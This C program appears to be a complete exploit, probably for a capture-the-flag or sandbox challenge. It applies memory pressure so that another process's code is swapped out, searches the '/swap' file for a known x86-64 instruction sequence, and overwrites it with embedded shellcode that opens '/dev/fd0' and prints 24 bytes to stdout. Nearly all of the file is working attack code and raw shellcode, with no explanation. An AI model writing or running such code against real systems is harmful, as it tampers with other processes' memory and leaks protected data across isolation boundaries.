#include <stdio.h>
#include <memory.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <assert.h>

#define SWAP_SIZE 0xa00000

const char NEEDLE[] = {0x80,0x3d,0x59,0x41,0x30,0x00,0x00,0x75,0x76,0x55,0x48,0x8b,0x05,0x57,0x41,0x30,0x00,0x48,0x89,0xe5,0x41,0x54,0x53,0xbb,0xf0,0x3f,0x70,0x00,0x41,0xbc,0xe8,0x3f,0x70,0x00,0x48,0x81,0xeb,0xe8,0x3f,0x70,0x00,0x48,0xc1,0xfb,0x03};

const char SHELLCODE[] = {0x48,0xb8,0x2f,0x64,0x65,0x76,0x2f,0x66,0x64,0x30,0x6a,0x00,0x50,0x48,0x89,0xe7,0xb8,0x02,0x00,0x00,0x00,0xbe,0x02,0x00,0x00,0x00,0x48,0x31,0xd2,0x0f,0x05,0x48,0x89,0xc7,0x6a,0x00,0x6a,0x00,0x6a,0x00,0x48,0x8d,0x34,0x24,0xb8,0x00,0x00,0x00,0x00,0xba,0x18,0x00,0x00,0x00,0x0f,0x05,0xb8,0x01,0x00,0x00,0x00,0xbf,0x01,0x00,0x00,0x00,0x0f,0x05};

unsigned char swap[SWAP_SIZE];

void read_swap(FILE *fp) {
	size_t already = 0;
       while(1) {
	       size_t res = fread(swap + already, 1, SWAP_SIZE - already, fp);
	       if(res == 0) {
		       assert(already == SWAP_SIZE);
		       return;
	       }
	       already += res;
       }
}

int main(int argc, char *argv[]) {
	for(int i=0;i<250;i++) {
		char *buf = mmap(NULL, 1024*1024, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		memset(buf, 0, 1024*1024);
		printf("iteration: %d\n", i);
		
		FILE *fp = fopen("/swap", "rb+");
		read_swap(fp);

		unsigned char *res = memmem(swap, SWAP_SIZE, NEEDLE, sizeof(NEEDLE));	
		if (res) {
			printf("RESULTS: %hhn\n", res);
			size_t off = res - swap;
			fseek(fp, off, SEEK_SET);
			fwrite(SHELLCODE, 1, sizeof(SHELLCODE), fp);

			return 0;
		}
		fclose(fp);	
	}

	return 0;
}
